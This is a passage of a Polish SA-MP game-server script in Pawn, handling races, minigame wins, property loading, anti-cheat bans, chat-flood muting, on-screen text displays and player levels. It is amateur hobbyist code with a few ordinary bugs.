	    sscanf(param, "p<|>is[40]ffffi", RaceInfo[rid][Rid], RaceInfo[rid][Rname], RaceInfo[rid][Rx], RaceInfo[rid][Ry], RaceInfo[rid][Rz], RaceInfo[rid][Rr], RaceInfo[rid][Rmodelid]);
	    RaceInfo[rid][Rcp] = CreateDynamicCP(RaceInfo[rid][Rx], RaceInfo[rid][Ry], RaceInfo[rid][Rz], 3.5, 0, 0, -1, 40.0);

		format(d3format, 64, "* {00AAFF}Wyœcig"C_O" *\n\n{FFAA00}%s", RaceInfo[rid][Rname]);
		Create3DTextLabel(d3format, -1, RaceInfo[rid][Rx], RaceInfo[rid][Ry], RaceInfo[rid][Rz] + 1, 25.0, 0, 1);

		CreateDynamicMapIcon(RaceInfo[rid][Rx], RaceInfo[rid][Ry], RaceInfo[rid][Rz], 55, -1, 0, 0);

		rid++;
		RacesCount++;
	}
	mysql_free_result();
	new allcp[11];
	for(new i; i < MAX_RACE; i++)
	{
	    if(isnull(RaceInfo[i][Rname])) break;

		format(param, 200, "SELECT COUNT(*) AS `qwe` FROM `race_cp` WHERE `race_id` = '%d'", RaceInfo[i][Rid]);
	    mysql_query(param);
		mysql_store_result();
	    mysql_fetch_field("qwe", allcp);
	    mysql_free_result();
	    RaceInfo[i][Rall_cp] = strval(allcp);
	}
	printf("Loaded %d races", rid);
	return 1;
}

public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	for(new i; i < MAX_RACE; i++)
	{
	    if(checkpointid == RaceInfo[i][Rcp])
	    {
			SetPVarInt(playerid, "eRaceID", i);
			ShowGameDraw(playerid, "~w~/RACE", 5000);
	        return 1;
	    }
	}
	SetPVarInt(playerid, "eRaceID", -1);
	SetPVarInt(playerid, "eTruckID", -1);

    if(pInFun[playerid] == 1 && SS_Trwa == 1 && GetPVarInt(playerid, "pZapisanySS") == 1)
	{
		KillTimer(SS_Timer);

		SS_Trwa = 0;
		SS_Timer = -1;
		SS_Zapisanych = 0;
		SS_Odliczanie = -1;
		DestroyDynamicCP(SS_CP);

		GivePlayerScore(playerid, 20);
		GivePlayerMoney(playerid, 10000);

		format(strx, sizeof strx, ""C_O"Gracz "C_B"%s"C_O" wygra³ Skoki!"C_B" 20"C_O"exp +"C_B" 10000$", pName[playerid]);
		format(bstrx, sizeof bstrx, "UPDATE `players` SET `won_ss` = `wond_ss` + 1 WHERE `nick` = '%s'", pName[playerid]);
		mysql_query(bstrx);
		pLoop(i)
		{
			if(IsPlayerConnected(i) == 1 && GetPVarInt(i, "pZapisanySS") == 1 && pInFun[i] == 1)
			{
				SetPVarInt(i, "pZapisanySS", 0);
				pInFun[i] = 0;
				Odstaw(i);
				SCM(i, 0x00AAFFFF, strx);
				DisablePlayerCheckpoint(i);
			}
		}
		UpdateFunTextDraw();
		return 1;
	}
	if(pInFun[playerid] == 1 && TW_Trwa == 1 && GetPVarInt(playerid, "pZapisanyTW") == 1 && TW_Checkpoint == checkpointid)
	{
	    if((GetTickCount() - TW_Tick) < 45000)
	    {
	        BanPlayer(playerid, "Anty Cheat", "AirBreak na TW");
	        return 1;
	    }

		KillTimer(TW_Timer);

		TW_Trwa = 0;
		TW_Timer = -1;
		TW_Zapisanych = 0;
		TW_Odliczanie = -1;

		GivePlayerScore(playerid, 20);
		GivePlayerMoney(playerid, 10000);

		format(strx, sizeof strx, ""C_O"Gracz "C_B"%s"C_O" wygra³ Tower! "C_B"20"C_O"exp +"C_B" 20000$", pName[playerid]);
		format(bstrx, sizeof bstrx, "UPDATE `players` SET `won_tr` = `won_tr` + 1 WHERE `nick` = '%s'", pName[playerid]);
		mysql_query(bstrx);
		pLoop(i)
		{
			if(IsPlayerConnected(i) == 1 && GetPVarInt(i, "pZapisanyTW") == 1 && pInFun[i] == 1)
			{
				SetPVarInt(i, "pZapisanyTW", 0);
				pInFun[i] = 0;
				Odstaw(i);
				SCM(i, 0x00AAFFFF, strx);
				DisablePlayerCheckpoint(i);
			}
		}
		UpdateFunTextDraw();
		return 1;
	}
	return 1;
}

forward CountdownRace(playerid, time);
public CountdownRace(playerid, time)
{
	if(time != -1)
	{
    	TogglePlayerControllable(playerid, 0);
    	if(time == 0) TogglePlayerControllable(playerid, 1);
    }

	if(time >= 0)
	{
	   	TD_Show(playerid, CountRace[time]);
		if(time < 5) TD_Hide(playerid, CountRace[time + 1]);
	}else TD_Hide(playerid, CountRace[0]);

	if(time > 0)
	{
		PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
	} else if(time != -1) PlayerPlaySound(playerid,1057,0.0,0.0,0.0);

	if(time > -1) SetTimerEx("CountdownRace", 1000, 0, "dd", playerid, time - 1);
	return 1;
}
public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid)) return 0;

    PlayerPlaySound(playerid,1056,0.0,0.0,0.0);

	if(GetPVarInt(playerid, "RacePlayer") == 1)
	{
	    new i = GetPVarInt(playerid, "eRaceID");

	    if(GetPVarInt(playerid, "RaceCP") <= RaceInfo[i][Rall_cp])
	    {
		    new mstr[120],row2[120];
		    new idt,race_id,size2,typ2,Float:x,Float:y,Float:z,size,typ, Float:x2,Float:y2,Float:z2;

   			format(mstr, 120, "SELECT * FROM `race_cp` WHERE `race_id` = '%d' ORDER BY `id` ASC", RaceInfo[i][Rid]);
			mysql_query(mstr);
			mysql_store_result();
			new count=1;
			while(mysql_fetch_row(mstr, "|"))
			{
			    if(count == GetPVarInt(playerid, "RaceCP"))
			    {
			        sscanf(mstr, "p<|>iifffii", idt,race_id,x,y,z,size,typ);
			        mysql_fetch_row(row2, "|");
			        sscanf(row2, "p<|>iifffii", idt,race_id,x2,y2,z2,size2,typ2);
			        break;
			    }
				count++;
			}
			mysql_free_result();

		    SetPlayerRaceCheckpoint(playerid, typ, x,y,z,x2,y2,z2, size);
		    new m = floatround((GetTickCount() - GetPVarInt(playerid, "RaceTick"))/1000), h;
			while (m >= 60)
			{
				h++;
				m -= 60;
			}
		    format(mstr, 120, "%d:%02d~n~_~n~~r~~h~~h~%d/%d", h, m, GetPVarInt(playerid, "RaceCP"), RaceInfo[i][Rall_cp]);
		    ShowGameDraw(playerid, mstr, 2000);

		    SetPVarInt(playerid, "RaceCP", GetPVarInt(playerid, "RaceCP") + 1);
	    }
	    else
	    {
	        KillTimer(GetPVarInt(playerid, "RaceTimer"));
	        ExitRace(playerid, 1);
			return 1;
	    }
   	    KillTimer(GetPVarInt(playerid, "RaceTimer"));
		SetPVarInt(playerid, "RaceTimer", SetTimerEx("ExitRace", 30000, 0, "dd", playerid, 0));
	    return 1;
	}
	return 1;
}
forward ExitRace(playerid, won);
public ExitRace(playerid, won)
{
	if(GetPVarInt(playerid, "RacePlayer") == 0) return 1;

	if(IsPlayerInAnyVehicle(playerid))
	{
	    SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	}
	SetPlayerVirtualWorld(playerid, 0);
	DisablePlayerRaceCheckpoint(playerid);
	SetPVarInt(playerid, "LastRace", GetPVarInt(playerid, "eRaceID") + 1);
	SetPVarInt(playerid, "RacePlayer", 0);

    if(won == 2) SetPVarInt(playerid, "LastRace", 0);

	if(won == 1)
	{
	    SetPVarInt(playerid, "LastRace", 0);
	    new mstr[150];
	    GivePlayerMoney(playerid, 10000);
	    GivePlayerScore(playerid, 5);

	    new time = floatround((GetTickCount() - GetPVarInt(playerid, "RaceTick"))/1000), h, m, pos;
		m = time;
		while (m >= 60)
		{
			h++;
			m -= 60;
		}
		new prekord[12];
		format(mstr, 150, "SELECT `time` FROM `race_record` WHERE `race_id` = '%d' AND `nick` = '%s'", RaceInfo[GetPVarInt(playerid, "eRaceID")][Rid], pName[playerid]);
		mysql_query(mstr);
		mysql_store_result();
		mysql_fetch_field("time", prekord);
		mysql_free_result();

		new rekord = strval(prekord);

		if(time < rekord || rekord == 0)
		{
			format(mstr, 150, "DELETE FROM `race_record` WHERE `race_id` = '%d' AND `nick` = '%s'", RaceInfo[GetPVarInt(playerid, "eRaceID")][Rid], pName[playerid]);
            mysql_query(mstr);
			format(mstr, 150, "INSERT INTO `race_record` (`nick`,`race_id`,`time`) VALUES ('%s', '%d', '%d');", pName[playerid], RaceInfo[GetPVarInt(playerid, "eRaceID")][Rid], time);
			mysql_query(mstr);
		}

		format(mstr, 150, "SELECT `nick` FROM `race_record` WHERE `race_id` = '%d'", RaceInfo[GetPVarInt(playerid, "eRaceID")][Rid]);
		mysql_query(mstr);
		mysql_store_result();
		while(mysql_fetch_row(mstr))
		{
			pos++;
			if(!strcmp(mstr, pName[playerid]))
			{
			    break;
			}

		}
		mysql_free_result();

		if(time < rekord || rekord == 0)
		{
			format(strx, sizeof strx, ""C_O"Wygra³eœ wyœcig \"%s\"!\n"C_B"Pobi³eœ swój rekord tej trasy!"C_O"\n\nTwoja nagroda: "C_B"10.000$ + 5exp\n"C_O"Twój czas to: "C_B"%d:%02d\n\n", RaceInfo[GetPVarInt(playerid, "eRaceID")][Rname],h,m);
			format(strx, sizeof strx, "%s"C_O"Twoja pozycja na tej trasie: "C_B"%d", strx, pos);
		}
		else
		{
			new rh, rm;
			rm = rekord;
			while (rm >= 60)
			{
				rh++;
				rm -= 60;
			}
			format(strx, sizeof strx, ""C_O"Wygra³eœ wyœcig \"%s\"!\n"C_B"Niestety, nie pobi³eœ swojego rekordu!"C_O"\n\nTwoja nagroda: "C_B"10.000$ + 5exp\n\n"C_O"Twój rekord: "C_B"%d:%02d\n"C_O"Twój czas to: "C_B"%d:%02d\n\n", RaceInfo[GetPVarInt(playerid, "eRaceID")][Rname],rh,rm,h,m);
			format(strx, sizeof strx, "%s"C_O"Twoja pozycja na tej trasie: "C_B"%d", strx, pos);
		}

		InfoBox(playerid, strx);

		mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'winrace'");
	}
	else if(won == 0)
	{
		Dialog(playerid, 568, DIALOG_BOX, ""C_O"Przegra³eœ!!!\n\nCzas na dojechanie do kolejnego punktu kontrolnego min¹³ lub zniszczy³eœ pojazd!", "Powtórz", "WyjdŸ");
	}
	pInFun[playerid] = 0;
	return 1;
}





ReadInteriorInfo( fileName[] )
{
	new File:file_ptr,  buf[256], tmp[64], idx, uniqId;

	file_ptr = fopen( fileName, io_read );
	if( file_ptr ){
  		while( fread( file_ptr, buf, 256 ) > 0){
		    idx = 0;

     		idx = token_by_delim( buf, tmp, ' ', idx );
			if(idx == (-1)) continue;
			uniqId = strval( tmp );

			if( uniqId >= MAX_INTERIORS ) return 0;

			idx = token_by_delim( buf, tmp, ' ', idx+1 );
		    if(idx == (-1)) continue;
		 	interiorInfo[uniqId][inIntID] = strval( tmp );

			idx = token_by_delim( buf, tmp, ' ', idx+1 );
		    if(idx == (-1)) continue;
			interiorInfo[uniqId][inExitX] = floatstr( tmp );

			idx = token_by_delim( buf, tmp, ' ', idx+1 );
		    if(idx == (-1)) continue;
			interiorInfo[uniqId][inExitY] = floatstr( tmp );

			idx = token_by_delim( buf, tmp, ' ', idx+1);
		    if(idx == (-1)) continue;
			interiorInfo[uniqId][inExitZ] = floatstr( tmp );

			idx = token_by_delim( buf, tmp, ' ', idx+1 );
		    if(idx == (-1)) continue;
			interiorInfo[uniqId][inExitA] = floatstr( tmp );

			idx = token_by_delim( buf, interiorInfo[uniqId][inName], ';', idx+1 );
		    if(idx == (-1)) continue;

		}
		fclose( file_ptr );
		return 1;
	}
	return 0;
}

ReadPropertyFile( fileName[] )
{
	new  File:file_ptr,tmp[128],buf[256],idx,Float:enX,Float:enY,Float:enZ,Float:enA,uniqIntId,pIcon;

	file_ptr = fopen( fileName, io_read );

	if(!file_ptr )return 0;

 	while( fread( file_ptr, buf, 256 ) > 0){
 	    idx = 0;

 	    idx = token_by_delim( buf, tmp, ',', idx );
		if(idx == (-1)) continue;
		pIcon = strval( tmp );

 	    idx = token_by_delim( buf, tmp, ',', idx+1 );
		if(idx == (-1)) continue;
		enX = floatstr( tmp );

  		idx = token_by_delim( buf, tmp, ',', idx+1 );
		if(idx == (-1)) continue;
		enY = floatstr( tmp );

		idx = token_by_delim( buf, tmp, ',', idx+1 );
		if(idx == (-1)) continue;
		enZ = floatstr( tmp );

 		idx = token_by_delim( buf, tmp, ',', idx+1 );
		if(idx == (-1)) continue;
		enA = floatstr( tmp );

		idx = token_by_delim( buf, tmp, ';', idx+1 );
		if(idx == (-1)) continue;
		uniqIntId = strval( tmp );

		CreateProperty( uniqIntId, pIcon, enX, enY, enZ, enA);
	}
	fclose( file_ptr );
	return 1;
}

CreateProperty( uniqIntId, iconId,  Float:entX, Float:entY, Float:entZ, Float:entA, name[64]="", owner=-1, price=0 )
{
	if( (unid+1) < MAX_PROPERTIES ){
		new I_d = CreatePickup( iconId ,23, entX, entY, entZ + 0.3, 0 );
		propPickups[I_d] = unid;
		properties[unid][eEntX] 	= entX;
		properties[unid][eEntY] 	= entY;
		properties[unid][eEntZ] 	= entZ;
		properties[unid][eEntA] 	= entA;
		properties[unid][eUniqIntId] = uniqIntId;
		properties[unid][eOwner] 	= owner;
		properties[unid][ePrice] 	= price;
		format( properties[unid][ePname], 64, "%s", name );

		return unid++;
	}
	return -1;
}

stock CountIP(ip[])
{
        new c = 0;
        for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && !strcmp(GetIP(i),ip)) c++;
        return c;
}
stock GetHighestID(exceptof = INVALID_PLAYER_ID)
{
        new h = 0;
        for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i != exceptof && i > h) h = i;
        return h;
}
forward god();
public god()
{
   new Float:hp;
   for(new i; i < 200; i++)
   {
      if(GetPlayerHealth(i, hp) > 100.1) return BanPlayer(i, "Anty Cheat", "God");
   }
   return 1;
}
forward antifakekill2(playerid);
public antifakekill2(playerid)
{
    antifakekill[playerid] --;
    if(antifakekill[playerid] > 5)
    {
        BanPlayer(playerid, "Anty Cheat", "Fake Kill");
    }
    return 1;
}
SoundForAll(sound)
{
	for(new i = 0; i < MAX_PLAYERS; i ++)
		if (IsPlayerConnected(i))
	PlayerPlaySound(i,sound,0.0,0.0,0.0);
}
AntiFlood_Check( playerid, bool:inc=true )
{
        AntiFlood_Data[playerid][floodRate] += inc ? RATE_INC : 0;
        AntiFlood_Data[playerid][floodRate] = AntiFlood_Data[playerid][floodRate] - ( GetTickCount() - AntiFlood_Data[playerid][lastCheck] );
        AntiFlood_Data[playerid][lastCheck] = GetTickCount();
        AntiFlood_Data[playerid][floodRate] = AntiFlood_Data[playerid][floodRate] < 0 ? 0 : AntiFlood_Data[playerid][floodRate];

        if ( AntiFlood_Data[playerid][floodRate] >= RATE_MAX )
        {
                #if THRESOLD_ACTION == 1
                        new name[MAX_PLAYER_NAME];
                        GetPlayerName( playerid, name, sizeof( name ) );
                        BanPlayer(playerid, "System", "Flood");
                #elseif THRESOLD_ACTION == 2
						new name[MAX_PLAYER_NAME];
                        GetPlayerName( playerid, name, sizeof( name ) );
                        KickPlayer(i, "System", "Flood.");
                #else
                        SCM( playerid, 0xC00000FF, "Zaprzestañ floodingu." );
                #endif

                return false;
        }

        return true;
}

AntiFlood_InitPlayer( playerid )
{
        AntiFlood_Data[playerid][lastCheck] = GetTickCount();
        AntiFlood_Data[playerid][floodRate] = 0;
}
forward reklama(playerid);
public reklama(playerid)
{
    if(polecamy >= sizeof(reklamaTD)) polecamy = 0;
    TextDrawSetString(Reklama,reklamaTD[polecamy]);

    polecamy++;
	return 1;
}
new reklamy_wiadomosc[][] = {
	""C_O"Widzisz czitera? Zg³oœ go administracji wpisuj¹c "C_B"/Report [id] [powod]"C_O"!",
	""C_O"Zapraszamy do rejestracji na naszym forum! "C_B"TOP.xaa.pl"C_B"!",
	""C_O"Chcesz, aby serwer by³ popularny i znany? "C_B"Zapraszaj znajomych"C_O"!",
	""C_O"Odkry³eœ b³¹d w mapie ("C_B"ptsDM"C_O") zg³oœ go na forum "C_B"TOP.xaa.pl "C_O"lub wpisz "C_B"/Bug"C_O"!",
	""C_O"Nie znasz komend? Wpisz "C_B"/CMD"C_B"!",
	""C_O"Chcesz zakupiæ "C_B"prywatny pojazd"C_O"? Wpisz "C_B"/Privcar"C_O"!",
	""C_O"Chcesz mieæ przywileje na serwerze? Zakup konto "C_B"VIP "C_O"Wpisuj¹c "C_B"/VIP"C_B"!",
	""C_O"Masz jakieœ "C_B"pytanie "C_O"do administracij? Wpisz "C_B"/pytaie"C_B"!",
	""C_O"Wszystkie "C_B"teleporty "C_O"znajdziesz pod "C_B"/teles"C_B"!",
	""C_O"Mi³ej gry ¿yczy "C_B"adminstracja Polskiego TOP Serwera"C_O"!"
};
forward piecmin(playerid);
public piecmin(playerid)
{
    SCMToAll(-1, reklamy_wiadomosc[random(sizeof(reklamy_wiadomosc))]);
}
forward dwieminuty(playerid);
public dwieminuty(playerid)
{
    if(fucions >= sizeof(fucionstd)) fucions = 0;
    TextDrawSetString(TDPolecamy,fucionstd[fucions]);

    fucions++;
	return 1;
}
forward playersarena(playerid);
public playersarena(playerid)
{
   new playeronl[1000];
   format(playeronl, sizeof(playeronl), "/Minigun___~w~(~r~%d~w~)", Server[minigunPlayers]);
   TextDrawSetString(TDArenki[0], playeronl);
   format(playeronl, sizeof(playeronl), "/Oneshoot___~w~(~r~%d~w~)", Server[oneshootPlayers]);
   TextDrawSetString(TDArenki[1], playeronl);
   format(playeronl, sizeof(playeronl), "/Rpg___~w~(~r~%d~w~)", Server[rpgPlayers]);
   TextDrawSetString(TDArenki[2], playeronl);
   format(playeronl, sizeof(playeronl), "/Jetpack___~w~(~r~%d~w~)", Server[jetpackPlayers]);
   TextDrawSetString(TDArenki[3], playeronl);
   format(playeronl, sizeof(playeronl), "/Snajper___~w~(~r~%d~w~)", Server[sniperPlayers]);
   TextDrawSetString(TDArenki[4], playeronl);
}

forward ResetCount(playerid);
public ResetCount(playerid)
{
        SetPVarInt(playerid, "TextSpamCount", 0);
}
forward CheckOnline();
public CheckOnline()
{
    Admins_Online = 0;
    Vips_Online = 0;
    Players_Online = 0;
    for(new x=0; x < MAX_PLAYERS; x++)
    {
        if(IsPlayerConnected(x))
        {
            Players_Online++;

            if(Administrator[x])
            {
                 Admins_Online++;
            }

            if(Vip[x])
            {
                Vips_Online++;
            }
        }
    }
    return 1;
}

forward Premia(playerid);
public Premia(playerid)
{
	GivePlayerScore(playerid, 10);
	GivePlayerMoney(playerid, 750);
	SCM(playerid, 0xFF9900ff,""C_O"|Premia| Dosta³eœ Premiê: "C_B"10 "C_O"exp i $"C_B"750"C_O"!");
}
stock VehicleIsTir(vehicleid)
{
	switch(vehicleid)
	{
		case 403,514,515:return 1;
	}
	return 0;
}

forward UpdateData();
public UpdateData()
{
	new Rok, Miesiac, Dzien;
	getdate(Rok, Miesiac, Dzien);

	new string[1000];
	format(string, sizeof string, "~g~%02d~r~:~g~%02d~r~:~g~%02d", Rok, Miesiac, Dzien);
	TextDrawSetString(DataDraw, string);
	return 1;
}

forward IsPlayerInArea(playerid, Float:minx, Float:miny, Float:maxx, Float:maxy);
public IsPlayerInArea(playerid, Float:minx, Float:miny, Float:maxx, Float:maxy)
{
    new Float:X, Float:Y, Float:Z;
    GetPlayerPos(playerid, X, Y, Z);
    if(X >= minx && X <= maxx && Y >= miny && Y <= maxy)
	{
        return 1;
    }
    return 0;
}

stock GetWeaponSlot(weaponid)
{
    new slot;
    switch(weaponid)
    {
        case 0,1: slot = 0;
        case 2 .. 9: slot = 1;
        case 10 .. 15: slot = 10;
        case 16 .. 18, 39: slot = 8;
        case 22 .. 24: slot =2;
        case 25 .. 27: slot = 3;
        case 28, 29, 32: slot = 4;
        case 30, 31: slot = 5;
        case 33, 34: slot = 6;
        case 35 .. 38: slot = 7;
        case 40: slot = 12;
        case 41 .. 43: slot = 9;
        case 44 .. 46: slot = 11;
    }
    return slot;
}

stock ResetPlayerWeapons2(playerid,...) //By Terminator3
{
	new weapons[13][2],
		arweapon = GetPlayerWeapon(playerid);
	for(new SL; SL < 13; SL++)
	{
		GetPlayerWeaponData(playerid, SL, weapons[SL][0], weapons[SL][1]);
	}
	if(numargs() <= 1)
		return 0;
	new ID;
	for(new z = 1; z < numargs(); z++)
	{
	    ID = getarg(z,0);

	    if(weapons[GetWeaponSlot(ID)][0] == ID)
			weapons[GetWeaponSlot(ID)][0] = 0;
	}
	ResetPlayerWeapons(playerid);
	for(new SL; SL < 13; SL++)
	{
	    if(weapons[SL][0] == 0)
			continue;
	    GivePlayerWeapon(playerid, weapons[SL][0], weapons[SL][1]);
	}
	if(weapons[GetWeaponSlot(arweapon)][0] == 0)
		SetPlayerArmedWeapon(playerid,0);
	else
		SetPlayerArmedWeapon(playerid, arweapon);
	return 1;
}

forward UpdateHealth(playerid);
public UpdateHealth(playerid)
{
	foreach(Player, i)
	{
        if(IsPlayerInArea(i, -11.67788, 1681.614, 432.0814, 2172.085))
		{
			TD_Show(i, StrefaDM);
			GangZoneFlashForPlayer(i, WojskoZone, 0xFF000080);
			SetPlayerMapIcon(i, 6, 358.9494, 1880.3906, 17.7049, 6, 0, MAPICON_LOCAL);
			SetPVarInt(i, "Wojskowy", 1);
		}
		else
		{
			if(GetPVarInt(i, "Wojskowy") == 1)
			{
	    		ResetPlayerWeapons2(i, 38, 37, 35, 36, 39, 40);
	    		SetPVarInt(i, "Wojskowy", 0);
	    		GangZoneStopFlashForPlayer(i, WojskoZone);
	    		TD_Hide(i, StrefaDM);
			}
		}
	    new string[5];
	    GetPlayerHealth(i, pHealth[i]);
        GetPlayerArmour(i, pArmour[i]);
        format(string, sizeof string, "%.0f%", pHealth[i]);
        TextDrawSetString(Zycie_TD[i], string);
        TextDrawShowForPlayer(playerid, Zycie_TD[i]);
        format(string, sizeof string, "%.0f%", pArmour[i]);
        TextDrawSetString(Armor_TD[i], string);
        if(pArmour[i] == 0) TextDrawHideForPlayer(playerid, Armor_TD[i]);
        else TextDrawShowForPlayer(playerid, Armor_TD[i]);

	}
	return 1;
}

forward LogoColor(playerid);
public LogoColor(playerid)
{

	ColorTranslateCD ++;
	if(ColorTranslateCD >= sizeof(ColorTranslate)) ColorTranslateCD = 0;

	TextDrawColor(Logo,ColorTranslate[ColorTranslateCD]);

	foreach(Player, x)
	{
		if(TytulChce[x] && IsPlayerConnected(x)){
			TextDrawShowForPlayer(x,Logo);
		}
	}

	return 1;
}

forward StartVote(pytanie_glosowania[]);
public StartVote(pytanie_glosowania[])
{
	mVote[vOdliczanka] --;


	if(mVote[vOdliczanka] <= 0)
	{
		KillTimer(mVote[TimerGlosowanie]);

		if(mVote[glos][0] > mVote[glos][1])
		{
			format(mVote[votebuffer], 155, "~g~Glosowanie!~n~~w~%s~n~~g~Tak! ~w~%d glosow", pytanie_glosowania, mVote[glos][0]);
		} else if(mVote[glos][0] < mVote[glos][1]) {
		    format(mVote[votebuffer], 155, "~g~Glosowanie!~n~~w~%s~n~~r~Nie! ~w~%d glosow", pytanie_glosowania, mVote[glos][1]);
		} else if(mVote[glos][0] == mVote[glos][1]) {
		    format(mVote[votebuffer], 155, "~g~Glosowanie!~n~~w~%s~n~~p~Remis! ~w~%d glosow razem", pytanie_glosowania, mVote[glos][0] + mVote[glos][1]);
		}

		for(new x, g = GetMaxPlayers(); x != g; x++)
		{
		    if(!IsPlayerConnected(x)) continue;

		    SetPVarInt(x, "Glosowal", 0);
		}

		SetTimer("ZamknijTD", 5000, false);
		mVote[vOdliczanka] = 0;
	} else {
		format(mVote[votebuffer], 155, "~g~Glosowanie!~n~~w~%s~n~~g~/Tak: ~w~%d~p~ | | ~r~/Nie: ~w~%d~n~~w~Koniec pytania za ~r~~h~%d sek", pytanie_glosowania, mVote[glos][0], mVote[glos][1], mVote[vOdliczanka]);
	}

	TextDrawSetString(mVote[TDVote][0], mVote[votebuffer]);
	return 1;
}
forward PW_Hide(playerid);
public PW_Hide(playerid)
{
	TD_Hide(playerid, PW[0]);
	TD_Hide(playerid, PW[1]);
}
forward ZamknijTD();
public ZamknijTD()
{
	for(new x, l = 2; x != l; x++)
		TextDrawHideForAll(mVote[TDVote][x]);

	return 1;
}

forward TD_Naprawa_TD_Czekaj_Hide(playerid);
public TD_Naprawa_TD_Czekaj_Hide(playerid)
{
	TD_Hide(playerid, Naprawa_TD[0]);
	TD_Hide(playerid, Naprawa_TD[1]);
}

forward TD_Naprawa_TD_Hide(playerid);
public TD_Naprawa_TD_Hide(playerid)
{
	TD_Hide(playerid, Naprawa_TD[0]);
	TD_Hide(playerid, Naprawa_TD[1]);
}

GetPlayerFPS(playerid)
{
    SetPVarInt(playerid, "DrunkL", GetPlayerDrunkLevel(playerid));
    if(GetPVarInt(playerid, "DrunkL") < 100) SetPlayerDrunkLevel(playerid, 2000);
    else {
        if(GetPVarInt(playerid, "LDrunkL") != GetPVarInt(playerid, "DrunkL")) {
            SetPVarInt(playerid, "FPS", (GetPVarInt(playerid, "LDrunkL") - GetPVarInt(playerid, "DrunkL")));
            SetPVarInt(playerid, "LDrunkL", GetPVarInt(playerid, "DrunkL"));
            if((GetPVarInt(playerid, "FPS") > 0) && (GetPVarInt(playerid, "FPS") < 256)) {
                return GetPVarInt(playerid, "FPS") - 1;
            }
        }
    }
    return 1;
}

forward Staty();
public Staty()
{
	new string[256];
	foreach(Player, i)
	{
		p_Secounds[i]++;
		if(p_Secounds[i] >= 60)
		{
			p_Secounds[i] = 0;
			p_Minutes[i]++;
			if(p_Minutes[i] >= 60)
			{
				p_Minutes[i] = 0;
				p_Hours[i]++;
			}
		}
	}
	foreach(Player, i)
	{
		if(IsPlayerConnected(i))
		{
			format(string, sizeof(string), "(~y~%d~w~)%s", (i), pName[i]);
			TextDrawSetString(TD_Nick[i], string);
			format(string, sizeof(string), "%d", GetPlayerScore(i));
			TextDrawSetString(TD_Exp[i], string);
			format(string, sizeof(string), "%d", GetPlayerLevel(i));
			TextDrawSetString(TD_Level[i], string);
			format(string, sizeof(string), "%d godz %d min %d sek", p_Hours[i], p_Minutes[i], p_Secounds[i]);
			TextDrawSetString(TD_Online[i], string);
			format(string, sizeof(string), "Ping: ~w~%d", GetPlayerPing(i));
			TextDrawSetString(TD_Ping[i], string);
			format(string, sizeof(string), "FPS: ~w~%d", GetPlayerFPS(i));
			TextDrawSetString(TD_FPS[i], string);
			format(string, sizeof(string), "(%d/~y~%d~w~/~r~%d~w~)", Players_Online, Vips_Online, Admins_Online);
			TextDrawSetString(Graczy[i], string);
			format(string, sizeof(string), "/gang");
			TextDrawSetString(TD_Gang[i], string);
		}
	}
	return 1;
}

stock ControlLevelUp(playerid)
{
    if(Level[playerid] < GetPlayerLevel(playerid))
    PlayerPlaySound(playerid, 1183,0.0,0.0,0.0);
    Level[playerid] = GetPlayerLevel(playerid);
    new String[255];
    format(String, sizeof(String), ""czat" "C_O"Gratulacje! Osi¹gn¹³es(as) "C_B"%d "C_O"level.", Level[playerid]);
    SCM(playerid, -1, String);
    SetTimerEx("InfoLevelEnd", 10000, false, "d", playerid);
}

forward InfoLevelEnd(playerid);
public InfoLevelEnd(playerid)
{
        PlayerPlaySound(playerid, 1184, 0.0, 0.0, 0.0);
        return 1;
}

forward TD_Teleport_Hide(playerid);
public TD_Teleport_Hide(playerid)
{
	TD_Hide(playerid, TD_Teleport_);
}
forward TD_Pojazd_Hide(playerid);
public TD_Pojazd_Hide(playerid)
{
    TD_Hide(playerid, TD_Pojazd);
}
stock GetPlayerLevel(playerid)
{
        new Lvl;
        do {
            Lvl++;
        } while(Lvl*Lvl*6 < GetPlayerScore(playerid));
        return (Lvl-1 < 1) ? 1 : Lvl-1;
}

stock GetPlayerNextExp(playerid)
{
        return (Level[playerid]+1)*(Level[playerid]+1)*6;
}

public Limit(playerid)
{
	if(GetPVarInt(playerid, "BladDziadygo") >= 2)
	{
        new string[128];
		format(string, sizeof(string), "Gracz %s zosta³ uciszony na %i minut z powodu flood czatu.", pName, PLAYER_MUTE_TIME_MINUTES);
		for(new i=0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i != playerid) SendClientMessageToAll(0xD00000AA, string);

		format(string, sizeof(string), "Zosta³eœ uciszony na %i minut za flood czatu.", PLAYER_MUTE_TIME_MINUTES);
		SCM(playerid, 0xD00000AA, string);

		SetTimerEx("Odciszanko", (PLAYER_MUTE_TIME_MINUTES * 60000), 0, "i", playerid);
		SetPVarInt(playerid, "Mucik", 1);

		CallRemoteFunction("OnPlayerGetMuted", "i", playerid);
	}
	SetPVarInt(playerid, "Wiadka", 0);
	SetPVarInt(playerid, "BladDziadygo", 0);
	return 1;
}

public Odciszanko(playerid)
{
	SCM(playerid, 0x28C900FF, "Zosta³eœ automatycznie odciszony.");
	SetPVarInt(playerid, "Mucik", 0);
	return 1;
}
forward RekordHide(playerid);
public RekordHide(playerid)
{
	PlayerPlaySound(playerid, 1098, 0.0, 0.0, 0.0);
}
forward WarnUnlock(playerid);
public WarnUnlock(playerid)
{
	WarnBlock[playerid] = false;
	return 1;
}
stock token_by_delim(const string[], return_str[], delim, start_index)
{
	new x=0;
	while(string[start_index] != EOS && string[start_index] != delim) {
	    return_str[x] = string[start_index];
	    x++;
	    start_index++;
	}
	return_str[x] = EOS;
	if(string[start_index] == EOS) start_index = (-1);
	return start_index;
}

new Wwin;
WalizkaWin(playerid)
{
	format(strx, sizeof strx, "UPDATE `players` SET `walizek` = `walizek` + 1 WHERE `nick` = '%s'", pName[playerid]);
	mysql_query(strx);
	mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'walizka'");
	switch(Wwin)
	{
	    case 0:
	    {
	        new rand = random(25000) + 1;
	        GivePlayerMoney(playerid, rand);
	        format(strx, sizeof strx, ""C_O"Gracz "C_B"%s "C_O"znalaz³ walizkê! Wygra³: "C_B"%d$", pName[playerid], rand);
	    }
